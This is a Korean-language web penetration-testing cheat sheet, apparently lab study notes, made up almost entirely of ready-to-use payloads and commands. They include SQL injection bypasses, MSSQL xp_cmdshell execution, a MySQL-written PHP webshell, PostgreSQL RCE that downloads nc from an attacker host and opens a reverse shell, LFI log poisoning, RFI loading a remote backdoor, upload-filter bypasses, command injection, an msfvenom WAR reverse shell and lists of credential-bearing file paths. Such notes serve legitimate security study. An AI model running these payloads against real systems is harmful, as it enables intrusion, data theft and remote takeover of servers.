# Web Application Attacks

## IDOR (Insecure Direct Object Reference)
- 사용자가 URL, 매개변수 등을 통해 직접 조작할 수 있을 때 발생하는 보안 취약점
- `http://<url>/account?id=123` -> `http://<url>/account?id=124`

---

## SQL Injection

### Login Bypass
```sql
'OR ''='
```

### MSSQL

#### Client Connection
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
- Impacket의 `mssqlclient.py`를 사용하여 MSSQL 서버에 접속
- `-windows-auth` 옵션은 Windows 인증을 사용하여 로그인

```sql
SELECT @@version;           -- MSSQL 서버 버전 확인
enum_db                     -- Enumeration DB
SELECT * FROM offsec.information_schema.tables;  -- 테이블 목록 확인
SELECT * FROM offsec.dbo.users;                  -- users 테이블 내용 조회
```

#### IMPERSONATE 권한 확인
```sql
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'hrappdb-reader'
```

**설명:**
1. `sys.server_permissions` - SQL Server의 서버 수준 권한 정보를 담고 있는 시스템 뷰
2. `sys.server_principals` - 서버 수준에서 정의된 보안 주체(Principal) 정보를 담고 있는 뷰
3. JOIN 조건 - 권한을 부여한 Grantor(부여자)의 ID를 보안 주체와 매칭
4. WHERE 조건 - `IMPERSONATE` 권한만 필터링 (다른 계정으로 가장할 수 있는 권한)

#### MSSQL Code Execution
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

```sql
-- 1. 고급 옵션 보기 허용
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. xp_cmdshell 기능 활성화
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. OS 명령어 실행
EXECUTE xp_cmdshell 'whoami';
```

**설명:**
- `sp_configure` - 서버 설정 값을 변경하는 명령
- `show advanced options` - 기본적으로 숨겨져 있는 고급 설정 옵션(xp_cmdshell 등)을 볼 수 있게 함
- `RECONFIGURE` - 변경한 설정을 즉시 적용
- `xp_cmdshell` - SQL 쿼리에서 직접 OS 명령어를 실행하게 해주는 확장 저장 프로시저


#### MSSQL Get Net-NTLMv2
```bash
sudo responder -I tun0 -v
```

```sql
EXEC xp_dirtree '\\10.10.14.6\share', 1, 1
```

### MySQL

#### Code Execution
```sql
' UNION SELECT sleep(5);-- -
```
- URL ENCODED로 실행해보기
- 이미 SQL에 접속한 상태라면 UNION을 제외해보기
- 띄워쓰기 on/off

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
- SQL 인젝션을 통해 PHP 웹셸 생성
- `INTO OUTFILE`을 사용하여 지정 경로에 파일 작성
- 생성된 파일에 접근 후, `cmd` 파라미터를 통해 명령어 실행 가능
- 예: `http://target/tmp/webshell.php?cmd=id`

#### MySQL Commands
```bash
mysql -hlocalhost -uadmin -padmin --skip-ssl
```

```mysql
SHOW GRANTS FOR CURRENT_USER();  -- 현재 접속한 계정의 권한 확인

update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' where user_id='ADM';
-- 문자는 ''로 감싸줘야 인식
-- 감싸지 않으면 컬럼명으로 인식
```

### PostgreSQL RCE
```bash
psql -h $IP -p 5437 -U postgres  

postgres=# \c postgres;
postgres=# DROP TABLE IF EXISTS cmd_exec;
postgres=# CREATE TABLE cmd_exec(cmd_output text);
postgres=# COPY cmd_exec FROM PROGRAM 'wget http://Kali IP/nc';
postgres=# DELETE FROM cmd_exec;
postgres=# COPY cmd_exec FROM PROGRAM 'nc -n <kali IP> 5437 -e /usr/bin/bash';
```

### SQLMap
```bash
sqlmap -u "http://192.168.211.52:3305/zm/index.php" \
       --data="view=request&request=log&task=query&limit=100&minTime=1466674406.084434" \
       -p limit -batch --level=5 --risk=3 --os-shell
```

**옵션 설명:**
- `-u` : 대상 URL 지정
- `--data` : POST 방식으로 보낼 데이터(Body 내용) 지정
- `-p limit` : 공격할 대상 파라미터 지정
- `-batch` : 모든 질문에 자동으로 기본값 선택 (비대화식 자동화 실행)
- `--level=5` : 탐지 강도 설정 (기본값 1, 최대 5) - 더 많은 테스트 페이로드 사용
- `--risk=3` : 공격 위험도 수준 설정 (기본값 1, 최대 3) - DB 부담 주는 페이로드도 시도
- `--os-shell` : SQL Injection을 통해 OS 명령어 쉘 실행 시도

---

## Directory Traversal (Path Traversal)

### 기본 공격
```
https://example.com/cms/login.php?language=en.html
→ 정상 요청

https://example.com/cms/login.php?language=../../../../home/kali/.ssh/id_rsa
→ 리눅스 사용자 SSH 개인키 접근

https://example.com/cms/login.php?language=..\..\..\..\windows\win.ini
→ Windows 시스템 설정 파일 접근
```

### 인코딩 우회
```
../../../../etc/passwd
→ 기본 공격

%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
→ `.`을 `%2e`로 인코딩하여 필터 우회

%252e%252e/%252e%252e/etc/passwd
→ 이중 인코딩(Double Encoding)으로 필터 우회
```

---

## Local File Inclusion (LFI)
- 공격자가 서버 내의 파일을 직접 열람하거나 실행할 수 있도록 유도하는 취약점
### 기본 LFI
```bash
curl http://example.com/index.php?page=../../../../../../../../../var/www/html/index.php
```
- 내부 파일을 읽을 수 있을 때 확인해보기 (패스워드가 노출될 수도 있음)

### Log Poisoning
```bash
curl https://example.com/index.php?page=../../../../../../../../../var/log/apache2/access.log
```
- Apache `access.log`를 LFI로 불러오기

```text
User-Agent: <?php system($_REQUEST['cmd']); ?>
```
- User-Agent에 PHP 코드 삽입(Log Poisoning)

```bash
../var/log/apache2/access.log&cmd=whoami
```
- 삽입된 PHP 코드로 명령 실행

---

## PHP Wrappers

### php://filter
```bash
curl https://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
```
- `php://filter`로 파일을 Base64로 인코딩하여 소스코드 노출

### data://
```bash
curl "https://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
- `data://` 래퍼로 Base64 인코딩된 PHP 코드 전달 후 `ls` 실행

### PHP ZIP Wrapper LFI
1. Create a PHP Reverse shell
2. Compress PHP file
3. Upload compressed file
4. Use the zip wrapper to extract the payload

```bash
php?page=zip://path/to/file.zip%23shell
```
- shell.php 업로드
- https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/

---

## Remote File Inclusion (RFI)

```bash
curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```
- 외부 서버의 악성 PHP 파일 로드 후 명령 실행
- responder에 반응

---

## File Upload Vulnerabilities
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/243fbacc-c0c6-4c3c-a8b8-1ca3b665a05e" />

### 우회 기법
```
example.php           → 정상 PHP 파일
example.pHP           → 대소문자 변형으로 확장자 필터 우회
example.php.txt       → 이중 확장자로 필터 우회
```

### 경로 조작
```
upload '../../../../../../../test.txt'
→ 업로드 경로를 벗어나 상위 디렉토리에 파일 저장

upload '../../../../../root/.ssh/authorized_keys'
→ SSH 공개키 덮어써서 백도어 접속 가능
```

### .htaccess를 이용한 우회
```bash
# cat .htaccess
AddType application/x-httpd-php .php16
```
- .htaccess 파일을 업로드하여 .php16 확장자도 PHP로 실행되도록 설정

### Magic Bytes를 이용한 우회
```bash
# cat ex.php
GIF89a;
<?php system($_REQUEST['cmd']) ;?>
```
- GIF 파일의 magic bytes를 추가하여 이미지로 위장

---

## Command Injection

### 기본 공격
```bash
;ifconfig          → 세미콜론(;)으로 기존 명령 종료 후 ifconfig 실행
%3Bifconfig        → 세미콜론(;)을 URL 인코딩한 버전
```

### PowerShell/CMD 확인
```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
- PowerShell 환경 여부 및 실행 위치 확인

### POST 데이터에 명령어 삽입
```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

---

## Bypass Techniques

### WAF Bypass
```
X-Forwarded-For: 127.0.0.1
```
- X-Forwarded-For 헤더를 이용한 WAF 우회

### phpinfo.php 활용
- 파일에서 경로 및 사용 가능 코드 확인
- 확장 모듈 확인

### Python Web Server 일반적인 파일명
```
main.py
app.py
server.py
run.py
wsgi.py
asgi.py
```

---

## WAR File
- war : Web Application Archive
- Java Archives (.jar), Java Server Pages (.jsp), Java Servlets, Java classes, webpages, css 등이 압축되어 있는 파일

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

---

## Interesting File Paths

### Linux
```bash
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
~/home/user/.bash_history

/etc/apache2/sites-enabled/000-default.conf
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/messages
/var/log/cron.log
/var/log/auth.log

/var/www/html/wp-config.php              <-- Wordpress
/var/www/configuration.php                <-- Joomla
/var/www/html/inc/header.inc.php         <-- Dolphin
/var/www/html/sites/default/settings.php <-- Drupal
/var/www/configuration.php                <-- Mambo
/var/www/config.php                       <-- PHP
```

### Windows
```powershell
C:/Windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/Panther/Unattend.txt
C:/Unattend.xml
C:/Autounattend.xml
C:/Windows/system32/sysprep

C:/inetpub/wwwroot
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/logfiles
```
